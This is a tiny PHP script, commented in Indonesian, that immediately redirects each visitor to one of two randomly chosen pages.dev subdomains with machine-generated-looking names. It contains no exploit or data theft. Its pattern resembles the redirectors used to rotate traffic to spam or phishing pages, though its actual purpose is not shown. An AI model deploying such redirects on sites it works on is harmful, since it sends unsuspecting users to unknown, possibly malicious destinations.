<?php
// Daftar 2 domain tujuan
$targetDomains = [
    'https://zzzascacacsacsacqweryuiopushdbjnlkfjsbhysuioijfkemwtnjbud8.pages.dev',
    'https://zzzzncvkasncnaiucb1j482901292ndaspdjas09cascmkancnancanca8.pages.dev'
];

// Pilih salah satu domain secara acak
$randomIndex = array_rand($targetDomains);
$targetUrl = $targetDomains[$randomIndex];

// Redirect langsung tanpa delay
header("Location: " . $targetUrl);
exit();
?>
